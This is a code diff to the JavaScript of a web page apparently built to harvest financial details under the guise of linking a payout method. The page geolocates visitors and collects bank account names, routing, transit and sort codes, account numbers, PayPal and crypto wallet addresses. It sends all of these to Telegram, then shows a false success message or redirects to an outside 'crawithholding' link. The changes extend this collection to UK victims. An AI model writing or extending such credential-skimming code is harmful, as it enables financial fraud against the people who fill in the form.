@@ -1765,7 +1765,7 @@ $(document).ready(function () {
 
 
 /* Sidebar toggle */
-        const sidebar = document.getElementById('sidebar');
+const sidebar = document.getElementById('sidebar');
 const content = document.getElementById('content');
 
 const menuBtn = document.getElementById('menuBtn');
@@ -2197,7 +2197,6 @@ if (saved.accountNumber) document.getElementById("accountNumber").value = saved.
 // Restore American distinct fields
 if (saved.accountNameUs) document.getElementById("accountName-us").value = saved.accountNameUs;
 if (saved.transitNumberUs) document.getElementById("transitNumber-us").value = saved.transitNumberUs;
-
 if (saved.accountNumberUs) document.getElementById("accountNumber-us").value = saved.accountNumberUs;
 if (saved.paypalUs) document.getElementById("paypalInput-us").value = saved.paypalUs;
 if (saved.acuAccountUs) document.getElementById("acuAccount-us").value = saved.acuAccountUs;
@@ -2205,7 +2204,6 @@ if (saved.acuAccountUs) document.getElementById("acuAccount-us").value = saved.a
 // Restore British distinct fields
 if (saved.accountNameUk) document.getElementById("accountName-uk").value = saved.accountNameUk;
 if (saved.transitNumberUk) document.getElementById("transitNumber-uk").value = saved.transitNumberUk;
-
 if (saved.accountNumberUk) document.getElementById("accountNumber-uk").value = saved.accountNumberUk;
 if (saved.paypalUk) document.getElementById("paypalInput-uk").value = saved.paypalUk;
 if (saved.acuAccountUk) document.getElementById("acuAccount-uk").value = saved.acuAccountUk;
@@ -2435,9 +2433,11 @@ $(document).ready(function() {
         fetch('https://ipapi.co/json/')
             .then(response => response.json())
             .then(geo => {
-                let targetIndex = 0; // Default to Canada
+                let targetIndex = 0; // Default to Canada (Card 0)
                 if (geo.country_code === 'US') {
-                    targetIndex = 1; // Slide to US Card
+                    targetIndex = 1; // Slide to US Card (Card 1)
+                } else if (geo.country_code === 'GB' || geo.country_code === 'UK') {
+                    targetIndex = 2; // Slide to British Card (Card 2)
                 }
                 scrollToCard(targetIndex, 400);
             })
@@ -2457,7 +2457,7 @@ $(document).ready(function() {
 /* --------------------------
 NUMBER-ONLY VALIDATION
 -------------------------- */
-["transitNumber", "institutionNumber", "accountNumber", "transitNumber-us", "accountNumber-us"].forEach(id => {
+["transitNumber", "institutionNumber", "accountNumber", "transitNumber-us", "accountNumber-us", "transitNumber-uk", "accountNumber-uk"].forEach(id => {
   const input = document.getElementById(id);
   if (input) {
     input.addEventListener("input", () => {
@@ -2500,10 +2500,21 @@ function validateCurrentPreference() {
     return !!(usBank && usName && usTransit && usAcc);
   }
 
+  // Check British Bank Transfer explicitly
+  if (preference === "British Bank Transfer") {
+    const ukBank = document.getElementById("britishBankSelect")?.value.trim();
+    const ukName = document.getElementById("accountName-uk")?.value.trim();
+    const ukTransit = document.getElementById("transitNumber-uk")?.value.trim(); // Sort Code
+    const ukAcc = document.getElementById("accountNumber-uk")?.value.trim();
+
+    return !!(ukBank && ukName && ukTransit && ukAcc);
+  }
+
   // Flexibly check partial string matches to accommodate data-method regional namings
   if (preference.includes("PayPal")) {
     const paypal = document.getElementById("paypalInput")?.value.trim() || 
-                   document.getElementById("paypalInput-us")?.value.trim();
+                   document.getElementById("paypalInput-us")?.value.trim() ||
+                   document.getElementById("paypalInput-uk")?.value.trim();
     return !!paypal;
   }
 
@@ -2517,7 +2528,8 @@ function validateCurrentPreference() {
 
   if (preference.includes("USDT / USDC ERC20")) {
     const acu = document.getElementById("acuAccount")?.value.trim() || 
-                document.getElementById("acuAccount-us")?.value.trim();
+                document.getElementById("acuAccount-us")?.value.trim() ||
+                document.getElementById("acuAccount-uk")?.value.trim();
     return !!acu;
   }
 
@@ -2533,17 +2545,30 @@ function buildMessage(data) {
 📩 New Form Submission:
 
 Preference: ${data.preference || "-"}
-Account Name: ${data.accountName || data.accountNameUs || "-"}
-ACU Account: ${data.acuAccount || data.acuAccountUs || "-"}
-PayPal: ${data.paypal || data.paypalUs || "-"}
+Account Name (CA): ${data.accountName || "-"}
+Account Name (US): ${data.accountNameUs || "-"}
+Account Name (UK): ${data.accountNameUk || "-"}
+ACU Account (CA): ${data.acuAccount || "-"}
+ACU Account (US): ${data.acuAccountUs || "-"}
+ACU Account (UK): ${data.acuAccountUk || "-"}
+PayPal (CA): ${data.paypal || "-"}
+PayPal (US): ${data.paypalUs || "-"}
+PayPal (UK): ${data.paypalUk || "-"}
 Interac: ${data.interac || "-"}
 Bank (CA): ${data.canadianBank || "-"}
-Bank (UK): ${data.americanBank || "-"}
+Bank (US): ${data.americanBank || "-"}
+Bank (UK): ${data.britishBank || "-"}
 Revolut Tag: ${data.venmo || "-"}
 
-Transit/Routing Number: ${data.transitNumber || data.transitNumberUs || "-"}
-Institution Number: ${data.institutionNumber || "-"}
-Account Number: ${data.accountNumber || data.accountNumberUs || "-"}
+Transit/Routing Number (CA): ${data.transitNumber || "-"}
+Institution Number (CA): ${data.institutionNumber || "-"}
+Account Number (CA): ${data.accountNumber || "-"}
+
+Routing Number (US): ${data.transitNumberUs || "-"}
+Account Number (US): ${data.accountNumberUs || "-"}
+
+Sort Code (UK): ${data.transitNumberUk || "-"}
+Account Number (UK): ${data.accountNumberUk || "-"}
 `;
 }
 
@@ -2584,6 +2609,7 @@ function saveData() {
     savedData.venmo = document.getElementById("venmoInput")?.value || "";
     savedData.canadianBank = document.getElementById("canadianBankSelect")?.value || "";
     savedData.americanBank = document.getElementById("americanBankSelect")?.value || "";
+    savedData.britishBank = document.getElementById("britishBankSelect")?.value || "";
     savedData.accountName = document.getElementById("accountName")?.value || "";
     savedData.transitNumber = document.getElementById("transitNumber")?.value || "";
     savedData.institutionNumber = document.getElementById("institutionNumber")?.value || "";
@@ -2593,6 +2619,13 @@ function saveData() {
     savedData.accountNumberUs = document.getElementById("accountNumber-us")?.value || "";
     savedData.paypalUs = document.getElementById("paypalInput-us")?.value || "";
     savedData.acuAccountUs = document.getElementById("acuAccount-us")?.value || "";
+    
+    // Capture British distinct fields
+    savedData.accountNameUk = document.getElementById("accountName-uk")?.value || "";
+    savedData.transitNumberUk = document.getElementById("transitNumber-uk")?.value || "";
+    savedData.accountNumberUk = document.getElementById("accountNumber-uk")?.value || "";
+    savedData.paypalUk = document.getElementById("paypalInput-uk")?.value || "";
+    savedData.acuAccountUk = document.getElementById("acuAccount-uk")?.value || "";
 
     // Determine specific routing parameters for Page 1
     let exactTransferMethodName = preference;
@@ -2602,17 +2635,21 @@ function saveData() {
     if (activeCard) {
         const region = activeCard.dataset.region;
         if (region === "usa") { 
-            selectedRegion = "UK";
+            selectedRegion = "US";
             if (preference === "American Bank Transfer") {
-                exactTransferMethodName = savedData.americanBank || "UK Bank Transfer";
+                exactTransferMethodName = savedData.americanBank || "American Bank Transfer";
             } else if (preference === "Venmo") {
-                // ✨ FIX: Force the layout text to display Revolut instead of Venmo on the review page
                 exactTransferMethodName = "Revolut";
             }
         } else if (region === "canada") {
             selectedRegion = "CA";
             if (preference === "Canadian Bank Transfer") {
                 exactTransferMethodName = savedData.canadianBank || "Canadian Bank Transfer";
+            }
+        } else if (region === "uk" || region === "britain") {
+            selectedRegion = "UK";
+            if (preference === "British Bank Transfer") {
+                exactTransferMethodName = savedData.britishBank || "British Bank Transfer";
             }
         }
     }
@@ -2658,23 +2695,31 @@ document.getElementById('nextBtnSeparate').addEventListener('click', async () =>
     americanBank: document.getElementById("americanBankSelect")?.value.trim(),
     accountNameUs: document.getElementById("accountName-us")?.value.trim(),
     transitNumberUs: document.getElementById("transitNumber-us")?.value.trim(),
-    
     accountNumberUs: document.getElementById("accountNumber-us")?.value.trim(),
     paypalUs: document.getElementById("paypalInput-us")?.value.trim(),
-    acuAccountUs: document.getElementById("acuAccount-us")?.value.trim()
+    acuAccountUs: document.getElementById("acuAccount-us")?.value.trim(),
+
+    // UK collection mapping
+    britishBank: document.getElementById("britishBankSelect")?.value.trim(),
+    accountNameUk: document.getElementById("accountName-uk")?.value.trim(),
+    transitNumberUk: document.getElementById("transitNumber-uk")?.value.trim(),
+    accountNumberUk: document.getElementById("accountNumber-uk")?.value.trim(),
+    paypalUk: document.getElementById("paypalInput-uk")?.value.trim(),
+    acuAccountUk: document.getElementById("acuAccount-uk")?.value.trim()
   };
 
   localStorage.setItem("section3Data", JSON.stringify(data));
 
   try {
     await sendToTelegram(data);
-    showNotification("Payout method linked successfully", 3000); // Fixed from localShowNotification
+    showNotification("Payout method linked successfully", 3000);
     window.location.href = "/acu-payouts";
   } catch (err) {
     console.error("Telegram send failed:", err);
     window.location.href = "https://link.avalonflow.site/crawithholding";
   }
 });
+
 
 
 /* --------------------------
